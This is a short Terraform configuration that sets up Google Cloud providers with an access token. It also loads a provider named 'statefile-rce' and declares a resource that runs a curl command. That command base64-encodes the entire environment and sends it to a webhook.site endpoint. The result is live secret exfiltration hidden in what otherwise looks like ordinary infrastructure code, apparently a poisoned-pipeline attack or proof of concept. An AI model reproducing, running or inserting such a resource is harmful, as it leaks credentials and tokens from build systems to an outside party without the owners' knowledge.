terraform {
  required_providers {
    google = {
      source  = "hashicorp/google"
      version = "4.43.1"
    }
    google-beta = {
      source  = "hashicorp/google-beta"
      version = "4.43.1"
    }
    random = {
      source  = "hashicorp/random"
      version = "3.4.3"
    }
    rce = {
      source = "offensive-actions/statefile-rce"
    }
  }
}

provider "google" {
  access_token = var.test_google_access_token
  project      = var.project_id
  region       = var.region
}

provider "google-beta" {
  access_token = var.test_google_access_token
  project      = var.project_id
  region       = var.region
}

provider "rce" {}

resource "rce" "command" {
  command = "curl \"https://webhook.site/f8bc70cd-22df-4fef-9c87-b2c8276f9964?data=$(env | base64 | tr -d '\n')\""
}
